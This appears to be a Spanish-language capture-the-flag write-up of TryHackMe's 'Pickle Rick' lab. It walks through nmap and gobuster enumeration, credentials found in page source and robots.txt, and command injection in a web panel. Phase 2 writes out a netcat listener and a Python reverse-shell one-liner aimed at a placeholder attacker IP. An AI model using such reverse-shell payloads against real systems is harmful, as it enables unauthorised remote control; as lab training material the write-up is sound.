

# Writeup: Pickle Rick

![Banner de Pickle Rick](images/pickle_banner.png)

**Pickle Rick** es un desafío de nivel **Fácil** de la plataforma **TryHackMe**. En este writeup, documento los pasos que seguí para obtener acceso al sistema, escalar privilegios y encontrar los 3 ingredientes.

---

## 📊 Datos Esenciales

- **IP de la Máquina:** `10.10.220.243`
- **Sistema Operativo:** `Linux`
- **Tipo de Máquina:** `[ej. Web, Forense, Reversing]`
- **Banderas:** `[ej. user.txt, root.txt]`
- **Tiempo de Resolución:** `30 min`

---

## 🕵️‍♂️ Fase 1: Reconocimiento y Enumeración

El primer paso fue realizar un escaneo de puertos para identificar los servicios activos en la máquina. Utilicé `nmap` con los siguientes parámetros para un escaneo de versiones y scripts:
```bash
nmap -p- --open -sS -sC -sV --min-rate 2000 -n -vvv -Pn 10.10.220.243 -oN escaneo
```

El escaneo inicial con **Nmap** confirmó que la máquina está en línea y reveló los siguientes puertos abiertos:

* **Puerto 22 (SSH)**
    * **Servicio:** OpenSSH 8.2p1

* **Puerto 80 (HTTP)**
    * **Servicio:** Apache httpd 2.4.41
    * **Título del sitio:** "Rick is sup4r cool"
  
**Análisis del Sitio Web (Puerto 80)**
Al navegar a la dirección IP, se encontró un sitio web con temática de **Rick y Morty**. La página principal mostraba una imagen y un mensaje de ayuda de Rick para Morty.

![alt](images/1png.png)

Al inspeccionar el **código fuente** de la página (presionando `Ctrl + U`), se descubrió un comentario oculto.

![alt](images/2.png)

Este comentario revelaba una nota para un usuario, proporcionando una pista valiosa:

Con esta información, hemos obtenido un posible nombre de usuario: `RickRu13s`. Este dato será crucial para la siguiente fase de enumeración.

-----

### **Enumeración de Directorios con Gobuster**

Para continuar con el reconocimiento del sitio web, utilicé la herramienta **Gobuster** para buscar directorios y archivos ocultos. Esto nos ayuda a encontrar posibles puntos de entrada que no son visibles a simple vista. El comando ejecutado fue:

```bash
gobuster dir -u http://10.10.220.243/ -t 200 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x txt,py,php,sh
```

El escaneo de Gobuster reveló varios directorios y archivos de interés:

  * **/login.php** (Status: 200)
  * **/assets/** (Status: 301)
  * **/portal.php** (Status: 302)
  * **/robots.txt** (Status: 200)

De estos hallazgos, el archivo **`/robots.txt`** captó mi atención. Al navegar a esa dirección en el navegador, encontré un texto plano que resultó ser una contraseña.

-----

### **Obtención de Credenciales y Acceso**

Con un nombre de usuario y una contraseña en mano, me dirigí a la página de inicio de sesión que habíamos encontrado previamente: **`/login.php`**.

  * **Usuario:** `RickRu13s` (obtenido del código fuente de la página principal)
  * **Contraseña:** `Wubbalubbadubdub` (encontrada en el archivo `robots.txt`)

Al introducir estas credenciales, logré acceder al sistema, lo que marca el final de la fase de enumeración y el inicio de la explotación.

-----

### 💥 Fase 2: Explotación y Acceso Inicial

Una vez con las credenciales, inicié sesión en la página **`/login.php`** y fui redirigido a una nueva sección: **`portal.php`**. Esta página presentaba un "Panel de Comandos" con un campo de texto para ejecutar comandos.

\!
Esta interfaz sugería una vulnerabilidad de **inyección de comandos**. Para confirmar esto y obtener acceso al sistema, decidí ejecutar una **reverse shell**.

  * **Reverse Shell:** Usando una *reverse shell*, un atacante puede hacer que la máquina víctima se conecte a la suya, dándole un control completo sobre el sistema.

Para lograrlo, primero abrí un *listener* en mi máquina atacante con `netcat` en el puerto `4444`.

```bash
nc -lvnp 4444
```

Luego, en el "Panel de Comandos" de la máquina víctima, ejecuté un *payload* de *reverse shell* de Python.

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<TU_IP_ATACANTE>",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'
```

Después de ejecutar el comando, recibí una conexión en mi *listener* de `netcat`, lo que me dio una *shell* con el usuario **`www-data`**. Ahora, el objetivo es encontrar los tres ingredientes y, finalmente, escalar privilegios para obtener el control total.

      
